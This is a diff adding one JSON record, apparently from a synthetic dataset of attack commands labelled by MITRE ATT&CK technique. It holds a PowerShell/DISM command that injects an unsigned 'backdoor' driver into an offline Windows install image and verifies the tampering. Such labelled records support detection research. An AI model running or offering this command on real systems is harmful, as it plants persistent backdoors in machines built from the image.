@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Wim /WimFile:C:\\Images\\install.wim /Index:1 /MountDir:C:\\Mount\\Install; dism /Image:C:\\Mount\\Install /Add-Driver /Driver:C:\\Payloads\\BackdoorDrv\\backdoor.inf /ForceUnsigned; dism /Unmount-Wim /MountDir:C:\\Mount\\Install /Commit; Get-FileHash C:\\Images\\install.wim -Algorithm SHA256; fc /b C:\\Images\\install_clean.wim C:\\Images\\install.wim",
+  "explanation": "Mounts an offline Windows image, injects an unsigned driver to patch the system image, commits changes, and verifies the modified image via hash and binary comparison.",
+  "rationale_steps": [
+    "Mount the target WIM with DISM using admin rights.",
+    "Add an unsigned driver to the offline image (malicious patch).",
+    "Commit and unmount to finalize the system image modification.",
+    "Validate changes by computing a new hash and comparing to baseline with fc."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-7053c5d6-baced79c",
+  "source_prompt_hash": "7053c5d6",
+  "timestamp_utc": "2025-09-30T04:53:44.701470Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
